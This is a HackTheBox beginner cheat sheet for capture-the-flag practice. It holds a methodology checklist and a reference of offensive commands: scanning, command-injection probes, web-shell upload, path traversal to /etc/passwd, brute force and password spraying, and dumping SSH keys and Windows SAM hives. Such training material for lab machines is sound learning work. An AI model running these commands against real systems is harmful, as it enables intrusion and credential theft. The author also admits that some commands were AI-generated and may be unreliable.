# HackTheBox - Beginner Cheat Sheet

> - [Getting Started with HackTheBox in 2025 | Cheatsheet Inside](https://www.youtube.com/watch?v=7ioVPaF41yE)
>   - Based on the [HackTheBox: Beginner Cheat Sheet - Alex's cheatsheet](https://www.notion.so/HackTheBox-Beginner-Cheat-Sheet-1f4463c9990c80f58aa0f00dfbff0b16?source=copy_link)

## This template is for:

- Beginners looking to start HackTheBox
- Players looking to solve easy boxes
- Players who want to have a more organised methodology

## How to use this template:

- Make a copy
- Delete these sections that you don’t need (like this one)
- As you learn more techniques, checks and tools, add it to your version of the list
- For each box you do, check items off as you go
- If you want to follow me or contribute, you can find me here https://linktr.ee/appsecexplained
- Good luck!

# Simple Methodology Checklist

Below is all of the basic steps and checks that we should work through as a minimum when looking at a target. A lot of the time one of these steps will reveal or solve the current step you’re on.

## **Enumeration**

- [ ]  Nmap scans
- [ ]  Service fingerprinting
  - [ ]  Banner-grab
  - [ ]  Searchsploit and google versions
- [ ]  Web recon
  - [ ]  Web stack & technologies
  - [ ]  Subdomains
  - [ ]  Endpoints
  - [ ]  Parameters
  - [ ]  Injection points
  - [ ]  Framework/CMS versions
- [ ]  Additional enumeration
  - [ ]  SNMP
  - [ ]  NFS shares
  - [ ]  SMB
  - [ ]  FTP
  - [ ]  DNS zone transfer
  - [ ]  SMTP
  - [ ]  LDAP

## **Foothold**

- [ ]  Low-hanging fruit
  - [ ]  Anonymous FTP
  - [ ]  SMB shares
  - [ ]  Default logins
- [ ]  Search for known exploits
- [ ]  Credential attacks
  - [ ]  Password reuse in different services
  - [ ]  Brute force
- [ ]  Web attacks
  - [ ]  Command injection
  - [ ]  File uploads
  - [ ]  SQLi
  - [ ]  Other common attacks
  - [ ]  Known exploit against framework/CMS

## **PrivEsc**

- [ ]  Whoami
- [ ]  `sudo -l`
- [ ]  Host system and version
- [ ]  What users exist
- [ ]  Groups and privileges
- [ ]  Environment variables
- [ ]  Files and directories
  - [ ]  SSH keys
  - [ ]  Creds in logs
  - [ ]  Suspicious binaries
  - [ ]  Backups
  - [ ]  History
  - [ ]  Home drives
  - [ ]  `/opt`
  - [ ]  DB creds in config files
  - [ ]  World-readable or writeable sensitive files
  - [ ]  SAM & SYSTEM
- [ ]  Linpeas & Winpeas
- [ ]  Suspicious or unusual services
- [ ]  pspy
- [ ]  Kernel exploits

# Key resources

- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz [book.hacktricks.xyz](https://book.hacktricks.xyz/)
- **Exploit-DB**: https://www.exploit-db.com [Exploit Database](https://www.exploit-db.com/)
- **GTFOBins**: https://gtfobins.github.io [gtfobins.github.io](https://gtfobins.github.io/)
- **LOLBAS** (Living-Off-The-Land Binaries & Scripts): https://lolbas-project.github.io [LOLBAS](https://lolbas-project.github.io/)
- **PEASS-ng (LinPEAS / WinPEAS)**: https://github.com/peass-ng/PEASS-ng [GitHub](https://github.com/peass-ng/PEASS-ng)
- **SecLists**: https://github.com/danielmiessler/SecLists [GitHub](https://github.com/danielmiessler/SecLists)
- **[revshells.com](http://revshells.com)** (Reverse-shell generator): https://www.revshells.com [Revshells](https://www.revshells.com/)
- **Pentestmonkey Reverse Shell Cheat-Sheet**: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

# Box list for starting out

- Do the first 5 by following the walkthroughs by Ippsec
- [ ]  Lame
- [ ]  Active
- [ ]  Shocker
- [ ]  Grandpa
- [ ]  Swagshop
- Do the next ones but with a timer (~45mins), once the timer goes off, if you’re stuck then take a peek at the walkthrough and then continue
- [ ]  Networked
- [ ]  Granny
- [ ]  Legacy
- [ ]  Optimum
- [ ]  Mirai
- [ ]  Doctor
- [ ]  Netmon
- [ ]  Scriptkiddie
- [ ]  Tabby
- [ ]  Heist

# Commands & tools reference

- *Note, for this section I used AI to generate some of the commands to save a bit of time, I’ve checked through but it might not be 100%.*

## Enumeration

### Nmap scans

- `nmap -A <target> -oN scan.initial` (quick service & version scan)
- `nmap -p- -A <target> -T4 -oN scan.full` (full-port TCP)
- `nmap -p- -sU --top-ports 200 <target> -oN scan.udp` (top UDP)

### Service fingerprinting

### Banner-grab

- `nc -nv <target> 80` (then type `HEAD / HTTP/1.0`)
- `curl -sv http://<target>/ -o /dev/null`
- `openssl s_client -connect <target>:443 -servername <target> | head`

### Searchsploit / Google versions

- `searchsploit "Apache Tomcat 7.0.88"`
- `searchsploit --nmap scan.initial`
- Google-fu -- `"<service> <version> exploit"`

### Web recon

### Web stack & technologies

- `whatweb -a 3 http://<target>`
- `httpx -tech-detect -title -status -ip -o tech.txt`
- ***Browser add-on: Wappalyzer***

### Sub-domains

- `ffuf -u http://<target> -H "Host: FUZZ.<target>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242`
- `feroxbuster --vhost -u http://<target> -w subdomains.txt`

### Endpoints / directories

- `ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403`
- `dirsearch -u http://<target> -e php,txt,bak`

### Parameters

- `arjun -u http://<target>/search.php`
- `paramspider -d <target-domain>`

### Injection points

- Manual probe in Burp Repeater: `test' "$IFS$(id)` etc.
- `wfuzz -u http://<target>/page.php?id=FUZZ -w /usr/share/wordlists/others/sql.txt --hc 404`

### Framework / CMS versions

- **WordPress:** `wpscan --url http://<target> --enumerate ap,at,tt,u --api-token <token>`
- **Drupal:** `droopescan scan drupal -u http://<target>`
- **Joomla:** `joomscan --url http://<target>`

### Additional enumeration

| Item                  | Linux / cross-platform                                       | Windows flavour                              |
| --------------------- | ------------------------------------------------------------ | -------------------------------------------- |
| **SNMP**              | `snmpwalk -v2c -c public <target> 1`                         | —                                            |
| **NFS shares**        | `showmount -e <target>` → `mount -t nfs <target>:/share /mnt` | —                                            |
| **SMB**               | `smbclient -L //<target> -N` (no pass) / `enum4linux -a <target>` / `smbmap -H <target>` | `net view \\\\<target>`                      |
| **FTP**               | `ftp <target>` (try `anonymous`) / `lftp <ftp://anonymous>@<target>` | Windows built-in `ftp`                       |
| **DNS zone transfer** | `dig axfr @ns1.<domain> <domain>` / `host -l <domain> ns1.<domain>` | `nslookup -type=any l <domain> ns1.<domain>` |
| **SMTP (user enum)**  | `swaks --to user@<target> --server <target> --quit` / `nc <target> 25` then `VRFY root` | `telnet <target> 25`                         |
| **LDAP**              | `ldapsearch -x -h <target> -b "dc=corp,dc=htb,dc=local"`     | `ldapsearch.exe` from WSL or ported binaries |

## Foothold

### Low-hanging fruit

| Check           | Handy commands                                               |
| --------------- | ------------------------------------------------------------ |
| Anonymous FTP   | `ftp <target>` → `anonymous / <blank>`                       |
| List SMB shares | `smbclient -L //<target> -N`                                 |
| Default logins  | `nmap --script http-default-accounts -p80,8080 <target>` / `hydra -L users.txt -P passwords.txt <target> http-get /admin` |

### Search for known exploits

- `searchsploit -m 49283` (download exploit)
- `msfconsole -q` → `search CVE-2021-41773` → `use exploit/multi/http/apache_path_traversal`

### Credential attacks

- **Password reuse / spray:** `crackmapexec smb <target> -u users.txt -p "Summer2024"`
- **Brute-force:** `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>`
- **Hash-crack:** `john --wordlist=rockyou.txt hash.txt`

### Web attacks

| Vector            | Go-to snippet                                                |
| ----------------- | ------------------------------------------------------------ |
| Command injection | `curl -G "http://<target>/ping?ip=127.0.0.1;id"`             |
| File uploads      | `curl -F "file=@shell.php" http://<target>/upload.php` then browse `/uploads/shell.php` |
| SQLi              | `sqlmap -u "http://<target>/item.php?id=1" --batch --current-db` |
| Other (LFI/RFI)   | `curl "http://<target>/index.php?page=../../../../etc/passwd"` |
| CMS exploit       | `wpscan --url http://<target> --enumerate vp --api-token <token>` then `searchsploit <vuln>` |

## Privilege Escalation

### Quick recon

```bash
whoami          # Windows: whoami /all
id              # Linux
sudo -l         # Linux
systeminfo      # Windows OS & patch level
uname -a        # Linux kernel
```

### Users / groups / env

- `cat /etc/passwd` | `net user /domain`
- `groups` | `whoami /groups`
- `env` / `printenv` | `set`

### Files & directories (pick & mix)

```bash
find / -perm -4000 -type f 2>/dev/null      # SUIDs
grep -Ri "password" /home /opt 2>/dev/null  # creds
ls -la /root /home/*/.*_history            # histories
```

- SSH keys → `cat ~/.ssh/id_rsa`
- SAM & SYSTEM → `reg save HKLM\\\\SAM sam` + `reg save HKLM\\\\SYSTEM system`

### Automated enum

- `./linpeas.sh -a` | `winpeas.exe cmd > winpeas.txt`
- `./pspy64` (watch cron / processes)

### Suspicious services

- `systemctl list-units --type=service` (Linux)
- `sc queryex type=service` / `wmic service get name,pathname,startmode` (Windows)

### Kernel exploits

- `uname -r` → if **< 4.8** consider DirtyCow (`searchsploit dirtycow`)
- `windows-exploit-suggester.py --systeminfo systeminfo.txt` (classic)

*If you spot `sudo NOPASSWD`*, consult **GTFOBins**.

*If you find `SeImpersonatePrivilege`*, drop **PrintSpoofer/Incognito/JuicyPotato**.